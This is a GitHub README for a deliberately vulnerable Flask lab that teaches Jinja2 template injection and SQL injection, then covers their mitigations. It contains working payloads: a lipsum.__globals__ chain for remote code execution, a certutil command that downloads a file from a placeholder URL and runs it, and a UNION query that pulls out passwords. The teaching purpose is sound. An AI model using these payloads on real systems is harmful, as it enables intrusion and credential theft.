# House-of-Liquor-
A deliberately vulnerable Flask web application built on Jinja2 to demonstrate SQL injection and Server-Side Template Injection (SSTI) leading to Remote Code Execution (RCE) via nmap, Gobuster, and tplmap to identify and exploit injection flaws.

> ## Disclaimer: This application is intentionally insecure. It exists solely for educational purposes to demonstrate real-world web application vulnerabilities and their mitigations in a controlled, local environment. Do not deploy this application on a public-facing server.

---

# This readme only contains the surface of the documentation. To read the full documentation please refer to [Documentation.pdf](./Documentation.pdf).

## Overview 

House of Liquor is a mock e-commerce liquor store that walks through the full lifecycle of an attack: reconnaissance, vulnerability discovery, exploitation, and remediation. The vulnerable route (`/review`) strings unsanitized input into a Jinja2 template string, and a separate search/login flow is vulnerable to SQL injection via unparameterized queries.

Two vulnerability classes are demonstrated end-to-end:

- **Server-Side Template Injection (SSTI)** — via Jinja2’s lipsum global object, escalated to full Remote Code Execution.
- **SQL Injection** — via UNION-based extraction of usernames and passwords through an unsanitized search query.

## Tech Stack

| Layer | Technology |
|---|---|
| Backend | Python, Flask |
| Templating | Jinja2 |
| Recon Tools | Nmap, Gobuster |
| Password Hashing (patched version) | bcrypt |

## Attack Methodology

### 1. Reconnaissance
- **Passive:** Identified the app as locally hosted on `http://127.0.0.1:5000`.
- **Active:**
  - `nmap 127.0.0.1` — basic port scan
  - `nmap -sV -p 5000 127.0.0.1` — service/version detection, revealed Python 3.12.10 and Werkzeug 3.1.8
  - `nmap -A -p 5000 127.0.0.1` — aggressive scan, fingerprinted the host OS (Windows 10)
  - `gobuster dir -u http://127.0.0.1:5000 -w common.txt -t 50` — directory enumeration, surfaced `/admin`, `/cart`, `/console`, `/dashboard`, `/login`, `/logout`, `/review`, `/search`, `/shop`

### 2. Attack Surface Identification
The `/review` endpoint (`name`, `message`, `product_id` via POST) was identified as a free-text field with no output encoding — the primary SSTI entry point.

### 3. SSTI Detection
Payload `{{7*7}}` submitted through the review form returned `49`, confirming the input was being evaluated as executable Jinja2 template code rather than treated as plain text.

### 4. Exploitation

**Config disclosure** — `{{config}}` dumped the full Flask config object, including `DEBUG: True` and the app's `SECRET_KEY`, which alone would let an attacker forge session cookies and impersonate any user.

**RCE via `lipsum`** — `lipsum` is a Jinja2 built-in injected into every template context by default, and it exposes a `__globals__` attribute with direct access to the `os` module — without needing to traverse `__class__` / `__mro__` / `__subclasses__` first. This made it a more concise RCE primitive than the more commonly cited `config.__class__.__init__.__globals__` chain.

```
{{lipsum.__globals__['os']}}
```
confirmed OS module access. From there:

```
{{lipsum.__globals__['os'].popen('certutil -urlcache -f <url> C:\\Users\\Public\\test.bat').read()}}
```
downloaded an arbitrary file to the host, verified with a `dir` payload, then executed with:
```
{{lipsum.__globals__['os'].popen('start C:\\Users\\Public\\test.bat').read()}}
```
achieving full command execution on the host machine.

**SQL Injection** — a UNION-based payload against the search field extracted usernames and passwords directly from the `users` table:
```
' UNION SELECT username, password FROM users--
```

## Mitigations Implemented

| Mitigation | What it addresses |
|---|---|
| **Host-based firewall** (Windows Defender) | Blocks/quarantines outbound file downloads triggered by RCE payloads (e.g. the `certutil` download). Note: this is a network-layer control, not a code fix — it doesn't close the SSTI hole itself. |
| **Data parameterization / input sanitization** | Root-cause fix — user input is passed as a template *variable* (`{{ name }}`) via `render_template_string(..., name=name)` instead of being string-concatenated directly into the template. This is the fix that actually closes SSTI. |
| **Disabling debug mode** (`app.run(debug=False)`) | Prevents leakage of stack traces, file paths, environment variables, and other sensitive data through Werkzeug's interactive debugger. |
| **Password hashing (bcrypt)** | Ensures that even if the database is exfiltrated (e.g. via the SQLi above), credentials aren't recovered in plaintext. Verified with `check_password_hash()` on login. |


### Vulnerable vs. patched code (SSTI)

**Vulnerable:**
```python
confirmation_html = render_template_string(
    "<p>Thank you, <strong>" + name + "</strong>! Your review has been submitted.</p>"
)
```

**Patched:**
```python
confirmation_html = render_template_string(
    "<p>Thank you, <strong>{{ name }}</strong>! Your review has been submitted.</p>",
    name=name
)
```

The vulnerable version treats `name` as raw template source, so `{{7*7}}` gets evaluated. The patched version passes `name` as a bound variable, so the same payload is rendered back as a literal string.


## Evaluation Summary

No single mitigation is sufficient on its own:
- The firewall only blocks the *symptom* (outbound downloads), not the SSTI vulnerability itself, and can be bypassed by attackers using alternate exfiltration methods.
- Password hashing limits blast radius after a breach but doesn't prevent the breach.
- Disabling debug mode reduces attacker recon value but doesn't patch the injection point.
- **Data parameterization is the only control here that fixes the root cause.**

Full advantages/disadvantages tables for each control (firewall, hashing, sanitization, debug mode) are in the report.


## Local Setup

This app is intentionally vulnerable — run **locally only**.

```bash
git clone https://github.com/samriddha-sapkota/House-of-Liquor.git
cd house-of-liquor
pip install -r requirements.txt
python app.py
```
App runs at `http://127.0.0.1:5000`.

## Screenshots

<img width="1223" height="689" alt="canvas" src="https://github.com/user-attachments/assets/bc6633d3-5d50-4c23-a04f-35793995205f" />

*Figure 1: {{7\*7}} output*

<img width="1163" height="868" alt="canvas" src="https://github.com/user-attachments/assets/4c4518e6-1d20-4911-8948-ccb50d1d45fc" />

*Figure 2: Config disclosure from {{config}} payload*

<img width="1227" height="645" alt="canvas" src="https://github.com/user-attachments/assets/a54b0bc5-ab49-465b-bae0-beb51aa414f8" />

*Figure 3: Malicious File Injection*

<img width="1188" height="620" alt="canvas" src="https://github.com/user-attachments/assets/0d7826ae-2ad7-40ef-810e-aabd17e3582b" />

*Figure 4: Malicious File Injection Output*
- The command was successfully completed as show.

<img width="1221" height="656" alt="canvas" src="https://github.com/user-attachments/assets/8f3777ce-2991-4c3f-8240-a32e5d8e0d19" />

*Figure 5: Execution of the Malicious File*

<img width="1362" height="903" alt="canvas" src="https://github.com/user-attachments/assets/8270d0a0-050e-447c-a0e2-6926e761e816" />

*Figure 6: Successfully Executed*
